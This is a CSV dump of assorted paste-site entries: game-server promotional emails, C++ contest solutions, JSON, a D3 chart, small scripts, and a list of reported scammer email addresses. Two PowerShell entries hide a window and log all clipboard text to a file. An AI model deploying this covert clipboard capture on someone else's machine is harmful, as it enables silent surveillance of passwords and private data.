id,title,username,language,date,content
GWgH64FA,Dieser Geburtstag auf GrandRP ist etwas ganz Besonderes!,Shpindlier,HTML,Thursday 29th of February 2024 12:04:51 PM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCjPEEC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Wir freuen uns euch zu verkünden, dass GrandRP offiziell 3 Jahre alt geworden ist! Um diesen Meilenstein zu feiern, haben wir ein brandneues Update auf allen Servern veröffentlicht. Dieses Update beinhaltet neue HUDs, Interfaces und ein spezielles In-Game-Event, mit dem ihr viel Spaß haben werdet!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
q7Y5jKNM,KRSU.7611,bofk,C++,Thursday 29th of February 2024 12:01:46 PM CDT,"#include <bits/stdc++.h>
 
using namespace std;

#define operation pair<int,pair<int,int>>
#define t first
#define x second.first
#define y second.second

int main() {
  ios::sync_with_stdio(0);
  cin.tie(0);
  int n;
  cin >> n;
  vector<long long> a(n);
  for (int i = 0; i < n; i++) {
    cin >> a[i];
  }
  int m;
  cin >> m;
  vector<operation> q(m);
  
  for (int i = 0; i < m; i++) {
    cin >> q[i].t;
    if (q[i].t == 1) {
      cin >> q[i].x;
    } else if (q[i].t == 2) {

    } else {
      cin >> q[i].x >> q[i].y;
    }
  }
  
  deque<long long> p(a.begin(), a.begin()+a.size()/2);
  deque<long long> s(a.begin()+a.size()/2, a.end());
  
  for (int i = 1; i < p.size(); i++) p[i] += p[i - 1];
  for (int i = s.size() - 2; i >= 0; i--) s[i] += s[i + 1];
  
  for (auto v : q) {
    if (v.t == 1) {
      if ((p.size() + s.size()) % 2 == 1) {
        p.push_back((p.size() > 0 ? p.back() : 0) + v.x);
      } else {
        s.push_front((s.size() > 0 ? s.front() : 0) + v.x);
      }
    } else if (v.t == 2) {
      if ((p.size() + s.size()) % 2 == 1) {
        s.pop_front();
      } else {
        p.pop_back();
      }
    } else {
      v.x--; v.y--;
      if (v.y < p.size()) {
        cout << p[v.y] - (v.x - 1 >= 0 ? p[v.x - 1] : 0) << ""\n"";
      } else if (v.x >= p.size()) {
        v.x -= p.size(); v.y -= p.size();
        cout << s[v.x] - (v.y + 1 < s.size() ? s[v.y + 1] : 0) << ""\n"";
      } else {
        long long sum = p.back() - (v.x - 1 >= 0 ? p[v.x - 1] : 0);
        v.y -= p.size();
        sum += s.front() - (v.y + 1 < s.size() ? s[v.y + 1] : 0);
        cout << sum << ""\n"";
      }
    }
  }
  
  return 0;
}"
PitcFuGK,Matchs (Soccer Point),AhmadXploit,Dart,Thursday 29th of February 2024 11:58:55 AM CDT,"{
  ""leagues"": [
    {
      ""image"": ""assets/images/laliga.png"",
      ""league"": ""La Liga"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/images-removebg-preview (2).png"",
      ""team1"": ""Real Madrid"",
      ""image2"": ""assets/images/barcelona.png"",
      ""team2"": ""Barcelona"",
      ""score"": ""4 : 1"",
      ""color"": ""#f72b91""
    },
    {
      ""image"": ""assets/images/images-removebg-preview (1).png"",
      ""league"": ""Premier League"",
      ""week"": ""Week 11"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man United"",
      ""score"": ""4 : 1"",
      ""color"": ""#3f51b5""
    },
    {
      ""image"": ""assets/images/seriea.png"",
      ""league"": ""Serie A"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man United"",
      ""score"": ""4 : 1"",
      ""color"": ""#4caf50""
    },
    {
      ""image"": ""assets/images/seriea.png"",
      ""league"": ""La Liga"",
      ""week"": ""Week 10"",
      ""image1"": ""assets/images/mc.png"",
      ""team1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""team2"": ""Man City"",
      ""score"": ""4 : 1"",
      ""color"": ""#ff9800""
    }
  ],
  ""matches"": [
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    },
    {
      ""image1"": ""assets/images/mc.png"",
      ""name1"": ""Man City"",
      ""image2"": ""assets/images/mu.png"",
      ""name2"": ""Man United"",
      ""date"": ""10 Oct"",
      ""time"": ""06:00""
    }
  ]
}"
Q0Li0g7L,This Birthday on Grand RP became special,Shpindlier,HTML,Thursday 29th of February 2024 11:47:35 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/yCjPEEC.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">We are thrilled to announce that Grand RP has officially turned 3 years old! To celebrate this milestone, we have released a brand new update on all servers. This update includes new HUDs, interfaces, and a special in-game event for you to enjoy.</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
s5vrF9yK,title_scatter_v2,NTahmid,HTML,Thursday 29th of February 2024 11:46:48 AM CDT,"```<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
    <script src=""https://rawgit.com/susielu/d3-annotation/master/d3-annotation.min.js""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation-group text {
      fill: #C86984;
    }

    .annotation-group line {
      stroke: #C86984;
    }

    .annotation-group path {
      stroke: #C86984;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        
        //X-axis label
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");


        //Y-axis label
        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        //Title of the chart
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        //Chart Legends
        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotation for the title
        const annotations = [
          {
            note: {
              label: ""Doping in professional bike racing"",
              bgPadding: 20,
              title: ""Chart Title""
            },
            color: [""#C86984""],
            x: margin.left + (width - margin.left - margin.right) / 2,
            y: margin.top / 2.6,
            dy: -30,
            dx: 0,
            type: d3.annotationCalloutCircle,
            subject: {
              radius: 100,         // radius of circle
              radiusPadding: 5   // padding to add around circle
            },
          }
        ];

        // Add annotation to the chart
        const makeAnnotations = d3.annotation()
          .annotations(annotations)
          .type(d3.annotationLabel)
          .accessors({
            x: d => xScale(d.x),
            y: d => yScale(parseTime(d.y))
          })
          .accessorsInverse({
             x: d => xScale.invert(d.x),
             y: d => yScale.invert(d.y)
          })
          .on('subjectover', function(annotation) {
            annotation.type.a.selectAll(""g.annotation-connector, g.annotation-note"")
              .classed(""hidden"", false)
          })
          .on('subjectout', function(annotation) {
            annotation.type.a.selectAll(""g.annotation-connector, g.annotation-note"")
              .classed(""hidden"", true)
          });

        svg.append(""g"")
          .attr(""class"", ""annotation-group"")
          .call(makeAnnotations);
      });
    </script>
  </body>
</html>
```"
Q5XBaVyY,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 11:40:25 AM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <queue>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const int maxn = 1e5 + 10;
int n, d;
ll p;
ll a[maxn];
bool check(int k) {
    ll sum = 0;
    priority_queue<ll> pq, greatest;
    for(int i = 0; i < n; i++) {
        pq.push(a[i]);
    }
    for(int i = 1; i <= d; i++) {
        ll max_tree = 0;
        if(!pq.empty()) {
            max_tree = pq.top();
            pq.pop();
        }
        sum += max_tree;
        if(i > k and !greatest.empty()) {
            pq.push(greatest.top());
            greatest.pop();
        }
        greatest.push(max_tree);
    }
    return sum >= p;
}
int main() {
    ios_base::sync_with_stdio(false);
    cin >> n >> p >> d;
    
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    int L = 1, R = d;
    int res = -1;
    while(L <= R) {
        int mid = (L + R) / 2;
        if(check(mid)) {
            L = mid + 1;
            res = mid;
        }
        else {
            R = mid - 1;
        }
    }
    if(res == d) {
        cout << ""seedno"" << endl;
    }
    else {
        cout << res << endl;
    }
    return 0;
}

"
5r4i1vAr,Review Trade Direct 365,fxvnpro,PHP,Thursday 29th of February 2024 11:39:06 AM CDT,https://www.fxvnpro.com/review-trade-direct-365/
820tzmTf,Untitled,502781,PowerShell,Thursday 29th of February 2024 11:38:17 AM CDT,"#adapted from https://github.com/samjones3/powershell-utilities/blob/main/PowerShell-Clipboard-Watcher.ps1
[CmdletBinding()]
param
(
)
 
$script:ErrorActionPreference = ""Stop""
Set-StrictMode -Version Latest
function PSScriptRoot { $MyInvocation.ScriptName | Split-Path }
Trap { throw $_ }
 
function Register-ClipboardWatcher
{
    if (-not (Test-Path Variable:Global:ClipboardWatcher))
    {
        Register-ClipboardWatcherType
        $Global:ClipboardWatcher = New-Object ClipboardWatcher
 
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -SupportEvent -Action `
        {
            Unregister-ClipboardWatcher
        }
    }
 
    return $Global:ClipboardWatcher
}
 
function Unregister-ClipboardWatcher
{
    if (Test-Path Variable:Global:ClipboardWatcher)
    {
        $Global:ClipboardWatcher.Dispose();
        Remove-Variable ClipboardWatcher -Scope Global
        Unregister-Event -SourceIdentifier ClipboardWatcher
    }
}
 
function Register-ClipboardWatcherType
{
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp -TypeDefinition `
    @""
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
 
public class ClipboardWatcher : IDisposable
{
    readonly Thread _formThread;
    bool _disposed;
 
    public ClipboardWatcher()
    {
        _formThread = new Thread(() => { new ClipboardWatcherForm(this); })
                      {
                          IsBackground = true
                      };
 
        _formThread.SetApartmentState(ApartmentState.STA);
        _formThread.Start();
    }
 
    public void Dispose()
    {
        if (_disposed)
            return;
        Disposed();
        if (_formThread != null && _formThread.IsAlive)
            _formThread.Abort();
        _disposed = true;
        GC.SuppressFinalize(this);
    }
 
    ~ClipboardWatcher()
    {
        Dispose();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
    public event Action Disposed = delegate { };
 
    public void OnClipboardTextChanged(string text)
    {
        ClipboardTextChanged(text);
    }
}
 
public class ClipboardWatcherForm : Form
{
    public ClipboardWatcherForm(ClipboardWatcher clipboardWatcher)
    {
        HideForm();
        RegisterWin32();
        ClipboardTextChanged += clipboardWatcher.OnClipboardTextChanged;
        clipboardWatcher.Disposed += () => InvokeIfRequired(Dispose);
        Disposed += (sender, args) => UnregisterWin32();
        Application.Run(this);
    }
 
    void InvokeIfRequired(Action action)
    {
        if (InvokeRequired)
            Invoke(action);
        else
            action();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
 
    void HideForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Load += (sender, args) => { Size = new Size(0, 0); };
    }
 
    void RegisterWin32()
    {
        User32.AddClipboardFormatListener(Handle);
    }
 
    void UnregisterWin32()
    {
        if (IsHandleCreated)
            User32.RemoveClipboardFormatListener(Handle);
    }
 
    protected override void WndProc(ref Message m)
    {
        switch ((WM) m.Msg)
        {
            case WM.WM_CLIPBOARDUPDATE:
                ClipboardChanged();
                break;
 
            default:
                base.WndProc(ref m);
                break;
        }
    }
 
    void ClipboardChanged()
    {
        if (Clipboard.ContainsText())
            ClipboardTextChanged(Clipboard.GetText());
    }
}
 
public enum WM
{
    WM_CLIPBOARDUPDATE = 0x031D
}
 
public class User32
{
    const string User32Dll = ""User32.dll"";
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hWndObserver);
}
""@
 
}
 
function Register-ClipboardTextChangedEvent
{
    param
    (
        [ScriptBlock] $Action
    )
    # before registering, unregister it, so there is no collision when you keep 
    # rerunning this thing during debugging and development.
    # the -EA flag tells it to run silently (as will throw an error if event is not already registered)
    Unregister-Event -SourceIdentifier ClipboardWatcher -EA 0
    $watcher = Register-ClipboardWatcher
    Register-ObjectEvent $watcher -EventName ClipboardTextChanged -Action $Action -SourceIdentifier ClipboardWatcher
}
 
Register-ClipboardTextChangedEvent -Action `
    {
        param
        (
            [string] $text
        )
 
        Add-Content -Path '.\text.txt' -Value ""$text`r`n"" -Encoding Unicode
    }"
s6S4xwcr,Untitled,502781,PowerShell,Thursday 29th of February 2024 11:33:16 AM CDT,"#adapted from https://github.com/samjones3/powershell-utilities/blob/main/PowerShell-Clipboard-Watcher.ps1
[CmdletBinding()]
param
(
)
 
$script:ErrorActionPreference = ""Stop""
Set-StrictMode -Version Latest
function PSScriptRoot { $MyInvocation.ScriptName | Split-Path }
Trap { throw $_ }
 
function Register-ClipboardWatcher
{
    if (-not (Test-Path Variable:Global:ClipboardWatcher))
    {
        Register-ClipboardWatcherType
        $Global:ClipboardWatcher = New-Object ClipboardWatcher
 
        Register-EngineEvent -SourceIdentifier PowerShell.Exiting -SupportEvent -Action `
        {
            Unregister-ClipboardWatcher
        }
    }
 
    return $Global:ClipboardWatcher
}
 
function Unregister-ClipboardWatcher
{
    if (Test-Path Variable:Global:ClipboardWatcher)
    {
        $Global:ClipboardWatcher.Dispose();
        Remove-Variable ClipboardWatcher -Scope Global
        Unregister-Event -SourceIdentifier ClipboardWatcher
    }
}
 
function Register-ClipboardWatcherType
{
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing -Language CSharp -TypeDefinition `
    @""
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
 
public class ClipboardWatcher : IDisposable
{
    readonly Thread _formThread;
    bool _disposed;
 
    public ClipboardWatcher()
    {
        _formThread = new Thread(() => { new ClipboardWatcherForm(this); })
                      {
                          IsBackground = true
                      };
 
        _formThread.SetApartmentState(ApartmentState.STA);
        _formThread.Start();
    }
 
    public void Dispose()
    {
        if (_disposed)
            return;
        Disposed();
        if (_formThread != null && _formThread.IsAlive)
            _formThread.Abort();
        _disposed = true;
        GC.SuppressFinalize(this);
    }
 
    ~ClipboardWatcher()
    {
        Dispose();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
    public event Action Disposed = delegate { };
 
    public void OnClipboardTextChanged(string text)
    {
        ClipboardTextChanged(text);
    }
}
 
public class ClipboardWatcherForm : Form
{
    public ClipboardWatcherForm(ClipboardWatcher clipboardWatcher)
    {
        HideForm();
        RegisterWin32();
        ClipboardTextChanged += clipboardWatcher.OnClipboardTextChanged;
        clipboardWatcher.Disposed += () => InvokeIfRequired(Dispose);
        Disposed += (sender, args) => UnregisterWin32();
        Application.Run(this);
    }
 
    void InvokeIfRequired(Action action)
    {
        if (InvokeRequired)
            Invoke(action);
        else
            action();
    }
 
    public event Action<string> ClipboardTextChanged = delegate { };
 
    void HideForm()
    {
        FormBorderStyle = FormBorderStyle.None;
        ShowInTaskbar = false;
        Load += (sender, args) => { Size = new Size(0, 0); };
    }
 
    void RegisterWin32()
    {
        User32.AddClipboardFormatListener(Handle);
    }
 
    void UnregisterWin32()
    {
        if (IsHandleCreated)
            User32.RemoveClipboardFormatListener(Handle);
    }
 
    protected override void WndProc(ref Message m)
    {
        switch ((WM) m.Msg)
        {
            case WM.WM_CLIPBOARDUPDATE:
                ClipboardChanged();
                break;
 
            default:
                base.WndProc(ref m);
                break;
        }
    }
 
    void ClipboardChanged()
    {
        if (Clipboard.ContainsText())
            ClipboardTextChanged(Clipboard.GetText());
    }
}
 
public enum WM
{
    WM_CLIPBOARDUPDATE = 0x031D
}
 
public class User32
{
    const string User32Dll = ""User32.dll"";
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool AddClipboardFormatListener(IntPtr hWndObserver);
 
    [DllImport(User32Dll, CharSet = CharSet.Auto)]
    public static extern bool RemoveClipboardFormatListener(IntPtr hWndObserver);
}
""@
 
}
 
function Register-ClipboardTextChangedEvent
{
    param
    (
        [ScriptBlock] $Action
    )
    # before registering, unregister it, so there is no collision when you keep 
    # rerunning this thing during debugging and development.
    # the -EA flag tells it to run silently (as will throw an error if event is not already registered)
    Unregister-Event -SourceIdentifier ClipboardWatcher -EA 0
    $watcher = Register-ClipboardWatcher
    Register-ObjectEvent $watcher -EventName ClipboardTextChanged -Action $Action -SourceIdentifier ClipboardWatcher
}
 
Register-ClipboardTextChangedEvent -Action `
    {
        param
        (
            [string] $text
        )
 
        Add-Content -Path '.\text.txt' -Value $text -Encoding Unicode
    }"
jPdyfT1e,Untitled,Josif_tepe,C++,Thursday 29th of February 2024 11:23:27 AM CDT,"#include <iostream>
#include <vector>
//#include <bits/stdc++.h>
#include <cmath>
#include <fstream>
#include <cstring>
#include <algorithm>
using namespace std;
typedef long long ll;
const ll  maxn = 3e5 + 10;
const ll  logn = 18;
const ll  INF = 2e15;

int main() {
    ios_base::sync_with_stdio(false);
    int n, q;
    cin >> n >> q;
    
    vector<int> v(n);
    vector<int> idx(55, -1);
    for(int i = 0; i < n; i++) {
        cin >> v[i];
        if(idx[v[i]] == -1) {
            idx[v[i]] = i;
        }
    }
    
    for(int i = 0; i < q; i++) {
        int x;
        cin >> x;
        cout << idx[x] + 1 << "" "";
        for(int j = 1; j <= 50; j++){
            if(idx[j] != -1 and idx[j] < idx[x]) {
                idx[j]++;
            }
        }
        idx[x] = 0;
    }
    
    return 0;
}

"
zhvMeZyr,TutorialPipeline,peepoHapppy,Python,Thursday 29th of February 2024 10:29:49 AM CDT,"import matplotlib.pyplot as plt

from environment import TutorialSolverEnv
from algorithms import DoubleDQN
from pipeline import LoggingStudy

def main():
    env = TutorialSolverEnv()

    state_dim = env.state_dim
    action_n = env.action_n

    trajectory_max_len = 100
    episode_n = 400

    epsilon_decrease = 1 / (trajectory_max_len * episode_n)
    agent = DoubleDQN(
            state_dim, action_n, gamma=0.9, tau=0.001, epsilon_decrease=epsilon_decrease
        )
    study = LoggingStudy(env, agent, 100, 1)

    study.study_agent(100)

    rewards = study.rewards_log
    estimates = study.q_value_log

    plt.plot(rewards, '.', label='Rewards')
    plt.plot(estimates, '.', label='Estimates')
    plt.xlabel(""Trajectory"")
    plt.ylabel(""Reward"")
    plt.legend()
    plt.savefig(""figures/rewards.png"")
    plt.show()

    plt.plot(study.sprints_log, ""."")
    plt.title(""Sprints count"")
    plt.xlabel(""Trajectory"")
    plt.ylabel(""Sprint"")
    plt.savefig(""figures/sprints.png"")
    plt.show()

    plt.plot(study.loss_log, ""."")
    plt.title(""Loss"")
    plt.xlabel(""Steps"")
    plt.ylabel(""Loss"")
    plt.savefig(""figures/loss.png"")
    plt.show()

if __name__ == ""__main__"":
    main()
"
nH5hJYGw,params*,Lorenzo501,Autohotkey,Thursday 29th of February 2024 10:09:07 AM CDT,"#Requires AutoHotkey 2.0
Test(""a"", ""b"")

Test(params*)
{
    MsgBox(params*) ; msgbox text = a, msgbox title = b
    MsgBox(params[1]) ; msgbox text = a
    MsgBox(params[2]) ; msgbox text = b
}"
f3FcV2Q9,Untitled,MeehoweCK,C++,Thursday 29th of February 2024 10:02:59 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

#define NEW_LINE std::cout << std::endl;

class Tablica2D {
	unsigned int W;
	unsigned int K;
	double** mTablica;
public:
	Tablica2D(unsigned int k, unsigned int w) : W{ w }, K{ k }, mTablica{ new double* [w] } {
		srand(time(nullptr));
		for (auto i{ 0 }; i < W; ++i) {
			mTablica[i] = new double[K];
			for (auto j{ 0 }; j < K; ++j) {
				mTablica[i][j] = 1.0 * rand() / RAND_MAX;
			}
		}
	}
	void print() const {
		for (auto i{ 0 }; i < W; ++i) {
			for (auto j{ 0 }; j < K; ++j) {
				std::cout << mTablica[i][j] << '\t';
			}
			NEW_LINE;
		}
	}
	~Tablica2D() {
		for (auto i{ 0 }; i < W; ++i) {
			delete[] mTablica[i];
		}
		delete[] mTablica;
	}
};

int main() {
	Tablica2D tablica{ 3, 8 };
	tablica.print();
	return 0;
}"
28wErf7b,Nigerian scammers [29-2-3/2024],bombaires,AIMMS,Thursday 29th of February 2024 09:57:05 AM CDT,"<a href=""mailto:unitednations.debtreco8899@gmail.com"">unitednations.debtreco8899@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+20161@gmail.com"">unitednations.debtreco8899+20161@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+7152@gmail.com"">unitednations.debtreco8899+7152@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+25158@gmail.com"">unitednations.debtreco8899+25158@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+21218@gmail.com"">unitednations.debtreco8899+21218@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15160@gmail.com"">unitednations.debtreco8899+15160@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+13078@gmail.com"">unitednations.debtreco8899+13078@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+15942@gmail.com"">unitednations.debtreco8899+15942@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+32102@gmail.com"">unitednations.debtreco8899+32102@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+32032@gmail.com"">unitednations.debtreco8899+32032@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+572@gmail.com"">unitednations.debtreco8899+572@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+19405@gmail.com"">unitednations.debtreco8899+19405@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+24824@gmail.com"">unitednations.debtreco8899+24824@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+16917@gmail.com"">unitednations.debtreco8899+16917@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+29467@gmail.com"">unitednations.debtreco8899+29467@gmail.com</a>
<a href=""mailto:unitednations.debtreco8899+7223@gmail.com"">unitednations.debtreco8899+7223@gmail.com</a>
